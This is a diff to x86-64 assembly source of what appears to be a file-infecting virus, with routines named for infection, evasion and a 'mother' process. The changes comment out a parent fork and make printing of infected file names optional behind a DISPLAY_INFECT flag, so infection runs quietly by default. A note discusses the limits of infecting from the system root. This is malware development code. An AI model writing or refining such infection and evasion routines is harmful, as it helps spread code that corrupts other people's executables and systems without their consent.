@@ -74,15 +74,16 @@ infected:
 
 mother:
 
-    mov rax, SYS_FORK
-    syscall
+; NOTE: uncomment these if you want parent to be forked
+;     mov rax, SYS_FORK
+;     syscall
 
-    test rax, rax
-    jz .child_process
+;     test rax, rax
+;     jz .child_process
 
-    jmp exit_ok
+;     jmp exit_ok
 
-.child_process:
+; .child_process:
 	; evasion routine
     call evasion_routine
     
@@ -339,7 +340,13 @@ infection_routine:
 
     ; print stuff
     lea rdi, [rsp]
-    call write_string_nl
+    
+    %ifdef DISPLAY_INFECT
+        call write_string_nl
+    %else
+        
+    %endif
+
     push rcx
     call infect_single_file
     pop rcx
@@ -1261,8 +1268,7 @@ null db 0
 ; excl_dir db `.`, 0, `..`, 0, `etc`, 0, `proc`, 0, `sys`, 0, `dev`, 0, `lost+found`, 0, `media`, 0, `mnt`, 0, `opt`, 0, `proc`, 0, `boot`, 0, `run`, 0, `var`, 0, 0
 
 %ifdef ROOT_MODE
-; TODO: mystery of grub-mkrescue - solve for super big uninit section
-; TODO: replace this w/ system root
+; NOTE: root wont work because there are background processes using those applications while infecting
 root_dirs db `/tmp/test`, 0, `/tmp/test2`,0,0
 excl_dir db `.`, 0, `..`, 0, 0
 %else
